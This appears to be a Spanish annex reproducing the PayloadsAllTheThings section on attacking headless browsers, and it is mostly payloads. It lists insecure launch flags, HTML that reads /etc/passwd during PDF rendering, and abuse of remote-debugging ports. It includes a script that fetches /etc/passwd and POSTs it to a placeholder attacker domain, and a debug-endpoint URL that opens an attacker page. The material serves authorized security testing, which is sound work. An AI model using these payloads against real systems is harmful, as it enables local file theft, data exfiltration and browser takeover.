# Server-Side Request Forgery (SSRF): anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Headless Browser/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Headless%20Browser/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Headless Browser / Headless Commands

```ps1
    google-chrome --headless[=(new|old)] --print-to-pdf https://www.google.com
```

```ps1
    firefox --screenshot https://www.google.com
```

```ps1
    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --headless --disable-gpu --window-size=1280,720 --screenshot="C:\tmp\screen.png" "https://google.com"
```

## 2. Local Archivo Read / Insecure Flags

```ps1
google-chrome-stable --disable-gpu --headless=new --no-sandbox --no-first-run --disable-web-security -–allow-file-access-from-files --allow-file-access --allow-cross-origin-auth-prompt --user-data-dir
```

```js
<script>
  async function getFlag(){
    response = await fetch("file:///etc/passwd");
    flag = await response.text();
  fetch("https://[ATTACKER.DOMAIN.TLD]/", { method: "POST", body: flag})
  };
  getFlag();
</script>
```

### Variantes presentes en tablas o texto del apartado

```text
--allow-file-access
/etc/passwd
```

## 3. Local Archivo Read / PDF Rendering

```html
    <html>
        <body>
            <script>
                window.location="/etc/passwd"
            </script>
        </body>
    </html>
```

```html
    <html>
        <body>
            <iframe src="/etc/passwd" height="640" width="640"></iframe>
        </body>
    </html>
```

### Variantes presentes en tablas o texto del apartado

```text
google-chrome-stable --headless[=(new|old)] --print-to-pdf https://site/file.html
```

## 4. Headless Browser / Remote Debugging Port

```json
    {
        "Browser": "Chrome/136.0.7103.113",
        "Protocol-Version": "1.3",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/136.0.0.0 Safari/537.36",
        "V8-Version": "13.6.233.10",
        "WebKit-Version": "537.36 (@76fa3c1782406c63308c70b54f228fd39c7aaa71)",
        "webSocketDebuggerUrl": "ws://127.0.0.1:9222/devtools/browser/d815e18d-57e6-4274-a307-98649a9e6b87"
    }
```

```ps1
    node --inspect app.js # default port 9229
    node --inspect=4444 app.js # custom port 4444
    node --inspect=0.0.0.0:4444 app.js
```

### Variantes presentes en tablas o texto del apartado

```text
--remote-debugging-port=
google-chrome-stable --headless=new --remote-debugging-port=XXXX ./index.html
--remote-allow-origins="*"
chrome://inspect/#devices
opera://inspect/#devices
--restore-last-session
chrome://settings
http://localhost:<port>/json/new?http://[ATTACKER.DOMAIN.TLD]/?port=<port>
http://127.0.0.1:<port>/json/version
--inspect
--remote-debugging-port
--remote-debugging-pipe
--user-data-dir
--user-data-dir=/path/to/data_dir
```

## 5. Network / Port Scanning

### Variantes presentes en tablas o texto del apartado

```text
<img>
time_to_error(random_port) > time_to_error(closed_port)*1.3
```

## 6. Headless Browser / CVE

```js
const browser = await puppeteer.launch({
    args: ['--no-sandbox']
});
```

### Variantes presentes en tablas o texto del apartado

```text
--no-sandbox
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
